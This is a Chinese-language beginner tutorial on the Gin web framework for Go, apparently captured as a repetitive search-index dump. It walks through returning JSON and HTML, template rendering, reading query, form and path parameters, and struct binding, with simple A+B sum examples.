\u003c/html\u003e 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#gin框架"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#简介"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#gin-v1-稳定的特性"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#框架初识"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#模板渲染"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e Document name: {{.name}} age: {{.age}} 由于实际开发中大多采用前后端分离式开发，模板技术的应用范围不大，所以这里不再赘述，有需要直接查文档就好。 Gin框架返回json package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/json\", func(c *gin.Context) { data := gin.H{\"name\":\"zeroy\", \"message\": \"hello world!\", \"age\": 18} c.JSON(http.StatusOK, data) }) type msg struct{ Name string `json:\"name\"`//有时为了方便前端开发，需要为类型名创建别名（反射） Message string Age int } r.GET(\"/another_json\", func(c *gin.Context) { data := msg{ \"zeroy\", \"Hello golang!\", 18, } c.JSON(http.StatusOK, data)//本质是msg的序列化 }) r.Run() } 获取querystring参数querystring参数即URL中?后的参数。 username := c.DefaultQuery(\"username\", \"zeroy\")//若查询不到username则默认值为zeroy address := c.Query(\"address\") 例程：A+B Problem web版 package main import ( \"github.com/gin-gonic/gin\" \"strconv\" ) func main() { r:=gin.Default() r.GET(\"/\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Query(\"a\")) b,_:=strconv.Atoi(c.Query(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 获取form参数 username := c.PostForm(\"username\") address := c.PostForm(\"address\") PostForm方法可以获取Post请求提交的参数。 获取path参数例程：A+B Problem web版（使用path参数传参） func main() { r:=gin.Default() r.GET(\"/:a/:b\",func (c *gin.Context) { a,_:=strconv.Atoi(c.Param(\"a\")) b,_:=strconv.Atoi(c.Param(\"b\")) c.JSON(200,gin.H{\"sum\":a+b,}) }) r.Run() } 参数绑定ShouldBind方法可以自动化绑定参数到某个struct中。 type People struct{ Name string `form:\"name\"`//设定别名，方便传参 Age int `form:\"age\"` BirthDay string `form:\"birthday\"` } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var zeroy People //传递的name，age，birthday等变量可以自动化绑定到zeroy中 if err := c.ShouldBind(\u0026zeroy); err == nil { c.JSON(http.StatusOK, gin.H{ \"name\":zeroy.Name, \"age\":zeroy.Age, }) } else { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) } }) r.Run() } 例程：A+B problem with 参数绑定 type Node struct{ X int `form:\"x\"` Y int `form:\"y\"` } func (node Node) sum() int{ return node.X+node.Y } func main() { r:=gin.Default() r.GET(\"/\", func(c *gin.Context) { var tmp Node if err := c.ShouldBind(\u0026tmp); err == nil { c.JSON(http.StatusOK, gin.H{ \"sum\":tmp.sum(), }) } else { c.JSON(http.StatusBadRequest,","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:1","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#gin框架返回json"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() 